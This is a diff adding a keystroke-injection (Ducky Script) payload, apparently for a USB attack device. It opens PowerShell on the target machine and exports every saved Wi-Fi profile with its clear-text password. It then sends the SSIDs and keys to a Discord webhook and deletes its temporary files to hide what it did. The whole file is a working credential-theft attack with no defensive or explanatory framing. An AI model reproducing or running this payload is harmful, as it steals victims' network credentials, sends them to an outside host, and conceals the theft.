@@ -1,0 +1,9 @@
+DELAY 1000
+GUI
+DELAY 500
+STRING powershell
+DELAY 700
+ENTER
+DELAY 1500
+STRING $p="$env:TEMP\wf_tmp"; New-Item -ItemType Directory -Path $p -Force | Out-Null; netsh wlan export profile folder="$p" key=clear | Out-Null; $items = Get-ChildItem -Path $p -Filter *.xml | ForEach-Object { [xml]$x = Get-Content $_.FullName; [PSCustomObject]@{ SSID = $x.WLANProfile.Name; Key = $x.WLANProfile.MSM.Security.SharedKey.KeyMaterial } }; $msg = ($items | Format-Table -AutoSize | Out-String); $body = @{ content = "``````$msg``````" } | ConvertTo-Json; Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1494375401550512258/FYIX2XROsy5vQnQrf5utVfwp-tMh4_HPQ1BU1BSwD27D5wZAQ1NRt4DpsTTlwcLYbb-J' -Method Post -Body $body -ContentType 'application/json'; Remove-Item -Path $p -Recurse -Force
+ENTER
